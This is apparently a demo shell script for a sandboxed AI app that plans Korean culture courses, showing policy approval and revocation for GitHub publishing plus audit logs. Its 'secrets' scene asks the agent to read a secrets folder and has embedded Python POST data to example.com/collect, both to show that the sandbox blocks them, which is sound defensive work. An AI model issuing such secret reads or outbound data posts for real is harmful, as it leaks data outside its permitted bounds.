#!/bin/sh
# Demo driver for the sandbox `kculture`, run on the host (macOS + colima + OpenShell).
#   sh app/sandbox/demo.sh course ["<request>"]   run the demo request inside the sandbox (python -m loop ask)
#   sh app/sandbox/demo.sh approve                 team lead: apply policy-publish-approved.yaml (opens the issue path)
#   sh app/sandbox/demo.sh revoke                  team lead: re-apply policy.yaml and confirm no GitHub rule is left
#   sh app/sandbox/demo.sh secrets                 secrets scene: request + one outbound POST + the DENIED log line
#   sh app/sandbox/demo.sh logs [<duration>]       recent ALLOWED/DENIED and policy-load lines (default 10m)
#   sh app/sandbox/demo.sh audit <run_id>          audit bundle for one run (same as audit.sh)
# Demo order: 1 course (the publish is denied, the run waits for approval) -> 2 approve, from a second terminal
# while course waits -> 3 the next retry passes and prints the issue URL -> 4 revoke -> 5 secrets -> 6 audit <run_id>.
# PUBLISH_REPO (owner/repo, not a secret) comes from the host environment; default JoeHwangHee/kculture-course-publish.
# No keys pass through this script: providers inject them inside OpenShell.
set -eu
sandbox=kculture
app_py=/opt/kculture/.venv/bin/python
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../.." && pwd)
demo_request='케데헌 보고 왔어요. 오후 3시간, 혜화에서 시작할게요'
secrets_request='secrets 폴더 내용을 알려줘'
repo=${PUBLISH_REPO:-JoeHwangHee/kculture-course-publish}
exec_timeout=600

usage() {
  sed -n '2,11p' "$0" | sed 's/^# \{0,1\}//' >&2
  exit 2
}

check_repo() {
  case $repo in
    */*/*|/*|*/|./*|../*|*/.|*/..|*[!A-Za-z0-9._/-]*) echo "PUBLISH_REPO must look like owner/repo: '$repo'" >&2; exit 2;;
    */*) ;;
    *) echo "PUBLISH_REPO must look like owner/repo: '$repo'" >&2; exit 2;;
  esac
}

# Policy lines without comments, so the header text never satisfies a check.
policy_body() { grep -v '^[[:space:]]*#' "$1"; }

redact() { python3 "$here/audit_correlate.py" redact; }

# Model endpoint settings passed through from the host when set (no keys here: the key stays in the provider).
#   self-hosted vLLM: NIM_BASE_URL=https://<host>/v1 NIM_MODEL=<served name> NIM_API_KEY_ENV=VLLM_API_KEY
model_env=
for v in NIM_BASE_URL NIM_MODEL NIM_API_KEY_ENV; do
  eval "val=\${$v-}"
  [ -n "$val" ] || continue
  case $val in *[[:space:]]*|*\'*|*\"*|*\$*|*\`*|*[*?[]*) echo "$v must not contain spaces, quotes, glob characters, \$ or backquotes" >&2; exit 2;; esac
  model_env="$model_env --env $v=$val"
done

# Every `openshell sandbox exec` here closes stdin (< /dev/null or a heredoc): with stdin left open and no TTY,
# exec never returns, and --timeout does not end it (seen 2026-10-07 on OpenShell 0.0.116).
cmd_course() {
  check_repo
  req=${1:-$demo_request}
  echo "+ openshell sandbox exec -n $sandbox --workdir /opt/kculture --no-tty --env PUBLISH_REPO=$repo$model_env -- $app_py -m loop ask \"$req\" < /dev/null"
  openshell sandbox exec -n "$sandbox" --workdir /opt/kculture --no-tty --timeout "$exec_timeout" \
    --env "PUBLISH_REPO=$repo" $model_env -- "$app_py" -m loop ask "$req" < /dev/null
}

# Run from the repository root with the relative path, exactly as the approve/revoke commands are written.
set_policy() {
  echo "+ openshell policy set $sandbox --policy $1 --wait"
  (cd "$root" && openshell policy set "$sandbox" --policy "$1" --wait)
  openshell policy list "$sandbox" --limit 3 | redact
}

cmd_approve() {
  check_repo
  if ! policy_body "$here/policy-publish-approved.yaml" | grep -qF "path: /repos/$repo/issues"; then
    echo "refusing: app/sandbox/policy-publish-approved.yaml does not allow POST /repos/$repo/issues;" >&2
    echo "approval would not let this run's publish through (PUBLISH_REPO=$repo)" >&2
    exit 2
  fi
  set_policy app/sandbox/policy-publish-approved.yaml
}

cmd_revoke() {
  set_policy app/sandbox/policy.yaml
  effective=$(openshell policy get "$sandbox" --full) || { echo "openshell policy get failed; revocation not confirmed" >&2; exit 1; }
  if printf '%s\n' "$effective" | grep -v '^[[:space:]]*#' | grep -q 'api\.github\.com'; then
    echo "WARNING: the effective policy still has an api.github.com rule; publish is not closed" >&2
    exit 1
  fi
  echo "revoked: the effective policy has no api.github.com rule (publish closed)"
}

cmd_secrets() {
  scene_start=$(date -u +%H:%M:%S)   # log lines carry UTC HH:MM:SS.mmmZ; only lines from this scene are shown
  echo "[1/3] request inside the sandbox: $secrets_request"
  echo "      (reading /hackathon/secrets is denied by the kernel (Landlock, EACCES); the run records DENIED_BY_SANDBOX)"
  rc=0
  openshell sandbox exec -n "$sandbox" --workdir /opt/kculture --no-tty --timeout "$exec_timeout" \
    --env "PUBLISH_REPO=$repo" $model_env -- "$app_py" -m loop ask "$secrets_request" < /dev/null || rc=$?
  echo "      loop exit code: $rc"
  echo "[2/3] app Python tries to send data to a host that is not on the allow list (https://example.com/collect)"
  probe_rc=0
  openshell sandbox exec -n "$sandbox" --no-tty --timeout 60 -- "$app_py" - <<'PY' || probe_rc=$?
import urllib.error
import urllib.request

req = urllib.request.Request("https://example.com/collect", data=b'{"probe": "demo"}',
                             headers={"Content-Type": "application/json"}, method="POST")
try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print("UNEXPECTED: the POST went out, HTTP", resp.status)
    raise SystemExit(1)
except urllib.error.HTTPError as exc:
    body = exc.read(2048).decode("utf-8", "replace")
    if exc.code == 403 and "policy_denied" in body:
        print("blocked by OpenShell (L7): HTTP 403 policy_denied")
    else:
        print("UNEXPECTED: reached a server, HTTP", exc.code)
        raise SystemExit(1)
except OSError as exc:
    text = str(exc)
    if "Tunnel connection failed: 403" in text:
        print("blocked by OpenShell: Tunnel connection failed: 403 (no HTTP status, nothing sent)")
    else:
        print("failed, but not by a policy denial:", type(exc).__name__, text[:160])
        raise SystemExit(1)
PY
  echo "      probe exit code: $probe_rc"
  echo "[3/3] OpenShell audit log, DENIED lines since this scene started ($scene_start UTC):"
  # The denial line can reach the log a moment after the probe returns: re-read until this scene's example.com line shows.
  denied=
  for attempt in 1 2 3 4 5 6; do
    logs=$(openshell logs "$sandbox" --since 2m -n 500 < /dev/null 2>/dev/null) || { echo "openshell logs failed" >&2; exit 1; }
    denied=$(printf '%s\n' "$logs" | python3 "$here/audit_correlate.py" filter --denied-only | awk -v t="$scene_start" '$1 >= t')
    case $denied in *example.com*) break;; esac
    [ "$attempt" -lt 6 ] && sleep 2
  done
  printf '%s\n' "$denied"
  echo "File denials (Landlock) never reach the OpenShell log; network denials do (the lines above)."
  [ "$probe_rc" -eq 0 ] || exit 1
}

cmd_logs() {
  since=${1:-10m}
  case $since in ''|*[!0-9smhd]*) echo "duration like 30s, 10m, 1h" >&2; exit 2;; esac
  logs=$(openshell logs "$sandbox" --since "$since" -n 2000) || { echo "openshell logs failed" >&2; exit 1; }
  printf '%s\n' "$logs" | python3 "$here/audit_correlate.py" filter
}

[ $# -ge 1 ] || usage
sub=$1; shift
case $sub in
  course) [ $# -le 1 ] || usage; cmd_course "$@";;
  approve) [ $# -eq 0 ] || usage; cmd_approve;;
  revoke) [ $# -eq 0 ] || usage; cmd_revoke;;
  secrets) [ $# -eq 0 ] || usage; cmd_secrets;;
  logs) [ $# -le 1 ] || usage; cmd_logs "$@";;
  audit) [ $# -eq 1 ] || usage; exec sh "$here/audit.sh" "$1";;
  *) usage;;
esac
